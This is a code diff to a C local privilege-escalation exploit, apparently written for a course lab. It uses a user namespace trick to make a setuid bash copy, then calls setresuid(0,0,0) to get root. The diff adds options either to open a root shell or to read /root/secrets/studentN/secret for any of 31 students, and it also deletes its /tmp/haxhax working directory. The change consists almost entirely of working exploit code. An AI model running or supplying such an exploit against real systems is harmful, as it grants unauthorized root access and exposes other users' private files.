@@ -20,7 +20,9 @@
 #include <linux/sched.h>
 #include <sys/wait.h>
 
+#define BASH_CMD_SIZE (150)
 #define CHILD_STACK_SIZE (1024 * 1024)
+
 static char child_stack[CHILD_STACK_SIZE];
 
 static int child_exec(void *stuff)
@@ -43,7 +45,7 @@ static int child_exec(void *stuff)
     return 0;
 }
 
-static int escalate_priv(void)
+static int escalate_priv(char *bash_cmd)
 {
     if (fork() == 0) {
         if (unshare(CLONE_NEWUSER) != 0) {
@@ -68,15 +70,38 @@ static int escalate_priv(void)
 
     struct stat status;
     stat("/tmp/haxhax/u/bash", &status);
+    if(status.st_mode == 0x89ed) {
+        execl("/tmp/haxhax/u/bash", "bash", "-p", "-c", bash_cmd, NULL);
+    }
 
-    if(status.st_mode == 0x89ed)
-        execl("/tmp/haxhax/u/bash","bash","-p","-c","rm -rf /tmp/haxhax;python -c \"import os;os.setresuid(0,0,0);os.execl('/bin/cat','cat','/root/secrets/student25/secret');\"",NULL);
-
-    fprintf(stderr,"couldn't create suid :(\n");
+    fprintf(stderr, "couldn't create suid :(\n");
     return -1;
 }
 
 int main(int argc, char **argv) {
-    int retval = escalate_priv();
-    return retval;
+    char bash_cmd[BASH_CMD_SIZE] =  "rm -rf /tmp/haxhax; "
+                                    "python -c \""
+                                    "import os; "
+                                    "os.setresuid(0,0,0); "
+                                    "os.execl(";
+    if (argc > 1) {
+        if (strcmp(argv[1], "--run-bash") == 0 || strcmp(argv[1], "-b") == 0) {
+            strcat(bash_cmd, "'/bin/bash', 'bash');\"");
+        } else if (strcmp(argv[1], "--secret-num") == 0 || strcmp(argv[1], "-n") == 0) {
+            if (argc < 3) {
+                fprintf(stderr, "please provide a number to a secret\n");
+                return -1;
+            }
+            if (atoi(argv[2]) < 1 || 31 < atoi(argv[2])) {
+                fprintf(stderr, "there are only 31 secrets\n");
+                return -1;
+            }
+            strcat(bash_cmd, "'/bin/cat', 'cat', '/root/secrets/student");
+            strcat(bash_cmd, argv[2]);
+            strcat(bash_cmd, "/secret');\"");
+        }
+    } else {
+        strcat(bash_cmd, "'/bin/cat', 'cat', '/root/secrets/student1/secret');\"");
+    }
+    return escalate_priv(bash_cmd);
 }
